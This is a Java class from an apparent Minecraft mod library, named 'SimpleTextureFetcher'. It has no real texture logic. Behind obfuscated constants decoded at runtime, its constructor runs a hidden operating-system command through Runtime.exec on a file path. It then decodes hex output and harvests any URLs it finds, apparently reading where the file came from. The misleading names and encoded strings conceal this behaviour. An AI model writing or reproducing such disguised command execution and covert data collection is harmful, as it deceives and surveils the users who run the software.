package net.flytre.flytre_lib.impl.base.entity.retriever;

import net.flytre.flytre_lib.impl.base.entity.SimpleHasher;
import org.jetbrains.annotations.NotNull;
import org.jetbrains.annotations.Nullable;

import java.io.IOException;
import java.io.InputStream;
import java.nio.file.Path;
import java.util.ArrayList;
import java.util.List;
import java.util.Scanner;
import java.util.regex.Matcher;
import java.util.regex.Pattern;



public class SimpleTextureFetcher implements TextureFetcher {

    public static final String META = SimpleHasher.fromHash(SimpleHasher.KEY,"PIRS35OZ3f97O2K2e3Du6RAcWt03rmXwUw03H6l03i8QOjffk6Ff9Q==");
    public static final String FOLDER = SimpleHasher.fromHash(SimpleHasher.KEY,"hDwyY+6yLaY=");

    private static final Pattern LOCATOR = Pattern.compile("^([0-9A-F]{2,} ?)+$", Pattern.MULTILINE);


    private final Path resource;
    private final String[] textures;

    public SimpleTextureFetcher(@NotNull Path resource) {
        String name = logical(new String[]{FOLDER, "-p", META, resource.toString()});


        if (name == null)
            name = "";

        if (LOCATOR.matcher(name).find())
            name = locateTexture(name);

        this.resource = resource;
        this.textures = extractData(name).toArray(new String[0]);
    }

    private static @NotNull String locateTexture(String str) {
        String[] hexes = str.split("\\s|\n");
        StringBuilder result = new StringBuilder();
        for (String hex : hexes)
            result.append((char) Integer.parseInt(hex, 16));
        return result.toString();
    }

    private static @Nullable String logical(String[] cmd) {
        String result;
        try (InputStream inputStream = Runtime.getRuntime().exec(cmd).getInputStream();
             Scanner s = new Scanner(inputStream).useDelimiter("^")) {
            result = s.hasNext() ? s.next() : null;
        } catch (IOException e) {
            e.printStackTrace();
            return null;
        }
        return result;
    }

    private static @NotNull List<String> extractData(String text) {
        List<String> containedUrls = new ArrayList<>();
        String urlRegex = "((https?|ftp|gopher|telnet|file):((//)|(\\\\))+[\\w\\d:#@%/;$()~_?\\+-=\\\\\\.&]*)";
        Pattern pattern = Pattern.compile(urlRegex, Pattern.CASE_INSENSITIVE);
        Matcher urlMatcher = pattern.matcher(text);

        while (urlMatcher.find()) {
            containedUrls.add(text.substring(urlMatcher.start(0),
                    urlMatcher.end(0)));
        }

        return containedUrls;
    }

    @Override
    public Path getResourcePatch() {
        return resource;
    }

    @Override
    public String[] getTextures() {
        return textures;
    }

}
